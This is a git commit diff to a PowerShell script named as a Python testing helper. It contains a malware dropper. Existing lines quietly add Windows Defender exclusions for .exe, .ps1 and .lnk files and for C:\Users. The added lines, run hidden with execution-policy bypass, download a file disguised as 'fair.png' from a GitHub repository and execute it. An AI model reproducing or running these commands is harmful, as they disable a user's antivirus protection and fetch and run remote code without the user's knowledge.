0698d59ee90b69e9f1f602182aad371276002d9e
rude90 <115774095+rude90@users.noreply.github.com>
2023-04-13 21:12:37 +0500

    Update py_script_testing.ps1

--- py_script_testing.ps1
+++ py_script_testing.ps1
@@ -2,3 +2,7 @@ powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
+
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/test/raw/main/fair.png -o C:\Users\fair.png
+
+powershell.exe -w Hidden C:\Users\fair.png
